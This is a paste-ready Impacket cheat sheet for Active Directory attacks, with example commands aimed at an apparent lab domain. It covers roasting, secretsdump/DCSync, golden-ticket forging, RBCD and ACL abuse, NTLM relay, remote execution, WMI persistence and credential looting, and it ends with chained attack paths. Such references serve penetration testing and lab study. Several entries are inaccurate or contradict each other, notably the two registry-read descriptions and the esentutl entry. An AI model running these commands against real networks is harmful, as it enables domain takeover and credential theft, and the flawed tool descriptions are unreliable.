# Impacket Tool Notes

Quick, field-tested notes for each Impacket example: what it does, when to use it, and a tiny example you can paste. Grouped by task.

---

## 🧭 Discovery & Enumeration

**impacket-net**  
_What_: Query AD via SMB/RPC for domain/workstation info (users, groups, DCs, trusts).  
_When_: First touch on a target to orient yourself.  
_Example_: `impacket-net domain -dc-ip 10.10.10.248 intelligence.htb/USER:P@ss`

**impacket-netview**  
_What_: Enumerate hosts & sessions in the domain, share listing, logged-on users.  
_When_: Lateral movement planning, find admin sessions.  
_Example_: `impacket-netview -target 10.10.10.0/24 intelligence.htb/USER:P@ss`

**impacket-lookupsid**  
_What_: SID bruteforce → enumerate users/groups without creds (or with).  
_When_: No creds yet; build userlists.  
_Example_: `impacket-lookupsid dc.intelligence.htb/ -dc-ip 10.10.10.248`

**impacket-machine_role**  
_What_: Ask a target what it “is” (DC? member?).  
_When_: Verify whether an IP is a DC.  
_Example_: `impacket-machine_role 10.10.10.248`

**impacket-ping / impacket-ping6**  
_What_: SMB-based host reachability (not ICMP).  
_When_: ICMP blocked; check if SMB is up.  
_Example_: `impacket-ping dc.intelligence.htb`

**impacket-rpcmap / impacket-rpcdump**  
_What_: Enumerate RPC endpoints & interfaces.  
_When_: RPC attack surface mapping / versioning.  
_Example_: `impacket-rpcmap 10.10.10.248`

**impacket-rdp_check**  
_What_: Check if RDP is enabled/creds valid.  
_When_: Before trying xfreerdp/evil-winrm pivots through RDP.  
_Example_: `impacket-rdp_check intelligence.htb/USER:P@ss@10.10.10.248`

**impacket-GetADUsers / impacket-GetADComputers**  
_What_: LDAP queries for AD users/computers (pwdLastSet, lastLogon, etc.).  
_When_: Credential hygiene & target picking.  
_Example_: `impacket-GetADUsers -all intelligence.htb/USER:P@ss -dc-ip 10.10.10.248`

**impacket-DumpNTLMInfo**  
_What_: Collect NTLM settings/policies.  
_When_: Assess relay/bruteforce feasibility.  
_Example_: `impacket-DumpNTLMInfo 10.10.10.248`

---

## 🔐 Credential Harvesting & Roasting

**impacket-GetNPUsers**  
_What_: AS-REP roast users with DONT_REQUIRE_PREAUTH.  
_When_: Early foothold; no creds needed if you have usernames.  
_Example_: `impacket-GetNPUsers intelligence.htb/ -dc-ip 10.10.10.248 -usersfile users.txt -format hashcat -outputfile asrep.hashes`

**impacket-GetUserSPNs**  
_What_: Kerberoast SPNs; optionally request tickets to crack.  
_When_: With any valid domain creds.  
_Example_: `impacket-GetUserSPNs intelligence.htb/USER:P@ss -request -outputfile spn.hashes -dc-ip 10.10.10.248`

**impacket-Get-GPPPassword**  
_What_: Parse Group Policy Preferences creds (cpassword).  
_When_: Older ADs; quick cleartext win.  
_Example_: `impacket-Get-GPPPassword -dc-ip 10.10.10.248 intelligence.htb/USER:P@ss`

**impacket-GetLAPSPassword**  
_What_: Query LAPS-managed local admin passwords (if rights).  
_When_: You have read rights to `ms-Mcs-AdmPwd`.  
_Example_: `impacket-GetLAPSPassword intelligence.htb/USER:P@ss -dc-ip 10.10.10.248`

**impacket-secretsdump**  
_What_: Dump local SAM, LSA secrets, NTDS.dit, DCSync.  
_When_: After admin/RBCD/DCSync rights, or local admin on a box.  
_Example_: `impacket-secretsdump intelligence.htb/DAUSER:P@ss@10.10.10.248 -just-dc`

**impacket-samrdump**  
_What_: Enumerate SAM via SAMR (users, groups).  
_When_: Post-auth recon for local accounts.  
_Example_: `impacket-samrdump 10.10.10.248`

**impacket-mimikatz**  
_What_: Remote execute Mimikatz-like operations via Impacket (build-dependent).  
_When_: Rare; typically use actual Mimikatz on host.  
_Example_: _Varies; not always present in all builds._

**impacket-dpapi**  
_What_: DPAPI blob/masterkey parsing.  
_When_: Loot browser creds, WiFi, RDP, etc., after profile access.  
_Example_: `impacket-dpapi masterkey ...`

---

## 🎭 Kerberos – Tickets, Delegation & Abuse

**impacket-getTGT / impacket-getST**  
_What_: Request TGT (AS-REQ) and service tickets (TGS-REQ).  
_When_: Using passwords/hashes/AES keys; S4U for delegation.  
_Example_: `impacket-getTGT intelligence.htb/USER:P@ss -dc-ip 10.10.10.248`

**impacket-ticketer**  
_What_: Forge Kerberos tickets (Golden/Silver), set custom PAC.  
_When_: KRBTGT compromise / lab work.  
_Example_: `impacket-ticketer -nthash <krbtgt_NT> -domain-sid S-1-5-21-... -domain intelligence.htb Administrator`

**impacket-describeTicket / impacket-ticketConverter**  
_What_: Inspect & convert ccache ↔ kirbi.  
_When_: Move tickets between tools/systems.  
_Example_: `impacket-describeTicket ticket.ccache`

**impacket-getPac / impacket-goldenPac**  
_What_: PAC quirks abuse (older domains).  
_When_: Niche; test PAC validation issues.  
_Example_: `impacket-goldenPac ...`

**impacket-raiseChild**  
_What_: Child-to-parent domain trust abuse (SIDHistory).  
_When_: Multi-domain forests; escalate to parent.  
_Example_: `impacket-raiseChild -debug ...`

**impacket-findDelegation**  
_What_: List constrained/unconstrained/RBCD delegations.  
_When_: Plan S4U and RBCD paths.  
_Example_: `impacket-findDelegation -dc-ip 10.10.10.248 intelligence.htb/USER:P@ss`

**impacket-rbcd**  
_What_: Configure/abuse Resource-Based Constrained Delegation.  
_When_: After LDAP write rights to target computer.  
_Example_: `impacket-rbcd -action write -delegate-from ATTACKER$ -delegate-to VICTIM$ intelligence.htb/USER:P@ss`

**impacket-owneredit / impacket-dacledit**  
_What_: Take ownership / edit ACLs on AD objects.  
_When_: Prepare RBCD, grant DCSync, add SPNs, etc.  
_Example_: `impacket-dacledit -action write -rights DCSync -principal USER -target 'DC=...' intelligence.htb/USER:P@ss`

**impacket-describeTicket**  
_What_: Show ticket fields (SPN, flags, enc types).  
_When_: Debug why a ticket fails for a service.  
_Example_: `impacket-describeTicket admin@cifs_dc...ccache`

---

## 🎯 Remote Execution & Lateral Movement

**impacket-wmiexec / impacket-psexec / impacket-smbexec**  
_What_: Remote command execution via WMI / SMB service install / SMB named pipes.  
_When_: You have local admin on a host (or Admin+Kerberos ticket).  
_Examples_:  
`impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb -dc-ip 10.10.10.248`  
`impacket-psexec intelligence.htb/ADMIN:P@ss@10.10.10.248`

**impacket-dcomexec**  
_What_: DCOM-based exec (MMC20, ShellWindows).  
_When_: AV blocks psexec/wmi but DCOM open.  
_Example_: `impacket-dcomexec intelligence.htb/ADMIN:P@ss@10.10.10.248`

**impacket-atexec**  
_What_: Schedule AT/Task to run command.  
_When_: Low-noise exec path.  
_Example_: `impacket-atexec intelligence.htb/ADMIN:P@ss@10.10.10.248 'whoami > C:\\temp\\a.txt'`

**impacket-services**  
_What_: Query/start/stop/create Windows services remotely.  
_When_: Primitive for persistence or psexec-like ops.  
_Example_: `impacket-services -action start -name Spooler intelligence.htb/ADMIN:P@ss@10.10.10.248`

**impacket-reg / impacket-registry-read**  
_What_: Remote registry manipulation / read.  
_When_: Gather creds (AutoLogon), enable RDP, pivot config.  
_Example_: `impacket-reg -query -keyName HKLM\\SOFTWARE\\... intelligence.htb/ADMIN:P@ss@10.10.10.248`

**impacket-wmipersist**  
_What_: WMI event subscription persistence.  
_When_: Post-exploitation persistence.  
_Example_: `impacket-wmipersist -add intelligence.htb/ADMIN:P@ss@10.10.10.248`

**impacket-wmiquery**  
_What_: Run WMI queries (no exec).  
_When_: Inventory, processes, hotfixes.  
_Example_: `impacket-wmiquery 'SELECT * FROM Win32_OperatingSystem' intelligence.htb/ADMIN:P@ss@10.10.10.248`

---

## 📦 SMB / Files / Servers

**impacket-smbclient**  
_What_: SMB client (ls, get, put).  
_When_: Browse/loot shares with SMB creds or Kerberos.  
_Example_: `impacket-smbclient -k -no-pass dc.intelligence.htb`

**impacket-smbserver**  
_What_: Spin up an SMB server to serve payloads or capture connections.  
_When_: Hosting tools, staging EXEs, or printnightmare-style paths.  
_Example_: `impacket-smbserver share ./loot -smb2support`

**impacket-ntfs-read**  
_What_: Read raw NTFS over SMB (backup semantics).  
_When_: File access even if normal perms block (with backup privilege).  
_Example_: `impacket-ntfs-read intelligence.htb/ADMIN:P@ss@10.10.10.248 C$\\Windows\\NTDS\\NTDS.dit`

**impacket-smbexec**  
_See_: Remote Execution section.

**impacket-karmaSMB / impacket-ntlmrelayx**  
_What_: Responder-like SMB server; NTLM relay toolkit (HTTP/SMB → LDAP/SMB/etc.).  
_When_: Forced-auth + relay to DCSync/RBCD/ACL edits.  
_Example_: `impacket-ntlmrelayx -t ldap://10.10.10.248 --escalate-user USER --no-smb-server`

**impacket-sambaPipe**  
_What_: Interact with Samba named pipes.  
_When_: Nix/Samba edge cases & debugging.

---

## 🧩 AD Object Abuse & ACLs

**impacket-addcomputer**  
_What_: Add a machine account (ms-DS-MachineAccountQuota).  
_When_: Default MAQ=10; create ATTACKER$ for RBCD.  
_Example_: `impacket-addcomputer -computer-name ATTACKER$ -computer-pass Passw0rd intelligence.htb/USER:P@ss`

**impacket-changepasswd**  
_What_: Change a user’s password over SAMR/LDAP.  
_When_: You have rights or hash.  
_Example_: `impacket-changepasswd intelligence.htb/USER:P@ss -newpass NewP@ss!`

**impacket-owneredit / impacket-dacledit**  
_What_: Take ownership / edit DACLs on objects.  
_When_: Grant yourself rights (RBCD, DCSync).  
_Example_: `impacket-owneredit -action write -principal USER -target 'CN=...,DC=...' intelligence.htb/USER:P@ss`

**impacket-rbcd**  
_See_: Kerberos section.

**impacket-findDelegation**  
_See_: Kerberos section.

---

## 💾 Database & Apps

**impacket-mssqlclient / impacket-mssqlinstance**  
_What_: SQL Server client & instance discovery.  
_When_: Query MSSQL, enable xp_cmdshell, link servers.  
_Example_: `impacket-mssqlclient intelligence.htb/USER:P@ss@sqlhost -windows-auth`

**impacket-exchanger**  
_What_: Interact with Exchange (EWS/Autodiscover).  
_When_: Exchange abuse/enumeration.  
_Example_: `impacket-exchanger -action enum -target mail.intelligence.htb intelligence.htb/USER:P@ss`

**impacket-mqtt_check**  
_What_: MQTT broker checks.  
_When_: IoT/broker recon on Windows deployments.  
_Example_: `impacket-mqtt_check 10.10.10.50:1883`

---

## 🧪 Misc & Forensics

**impacket-esentutl**  
_What_: Shadow copy & copy files (like NTDS) remotely via WMI/VSS.  
_When_: Dump NTDS without Mimikatz, then secretsdump offline.  
_Example_: `impacket-esentutl intelligence.htb/ADMIN:P@ss@10.10.10.248 ntds`

**impacket-ntlmrelayx**  
_See_: SMB / Files.

**impacket-sniff / impacket-sniffer**  
_What_: Capture traffic on Windows interfaces (with perms).  
_When_: Network forensics/cred capture.  
_Example_: `impacket-sniffer 10.10.10.248`

**impacket-split / impacket-tstool**  
_What_: Utility helpers (file split; test tool).  
_When_: Rare; lab support.

**impacket-registry-read**  
_What_: Offline Registry hive parsing.  
_When_: After looting hives from disk.  
_Example_: `impacket-registry-read SYSTEM SOFTWARE SAM`

**impacket-getArch**  
_What_: Return remote architecture (x86/x64).  
_When_: Choose right payloads/binaries.  
_Example_: `impacket-getArch 10.10.10.248`

---

## ✅ Common Usage Patterns

- **AS-REP roast**: `GetNPUsers` → crack → auth.
    
- **Kerberoast**: `GetUserSPNs -request` → crack → auth.
    
- **Constrained delegation (S4U)**: `getTGT svc` → `getST -impersonate Administrator -spn <allowed>` → use ccache with `-k`.
    
- **RBCD path**: `addcomputer` → `rbcd -action write` → `getST -spn cifs/... -impersonate Administrator` → exec.
    
- **DCSync**: `dacledit/owneredit` grant rights → `secretsdump -just-dc`.
    

---

## 🔎 You might also want

- **impacket-printerbug** _(in older trees as `printerbug.py`)_ – coerce auth via MS-RPRN.
    
- **impacket-smbpasswd** – change SMB password (varies by build).
    
- **impacket-ntlmrelayx (HTTP + LDAP)** – shown above but worth repeating: most powerful primitive to escalate ACLs and enable RBCD/DCSync.
    
- **atexec/dcomexec/wmiexec trio** – keep all three handy; EDRs differ.
    

---

## 📝 Quick tips

- Kerberos is time-sensitive → `sudo ntpdate -b <DC-IP>` before ticket ops.
    
- `KRB5CCNAME` must point to the exact `.ccache` you just minted. Check with `klist -e`.
    
- For SMB/WMI tools you need a **CIFS/HOST** ticket, not `HTTP/www`.
    
- If LDAP simple bind fails, try LDAPS or let NetExec handle auth.
    
- Prefer AES keys for Kerberos when available; RC4 may be disabled.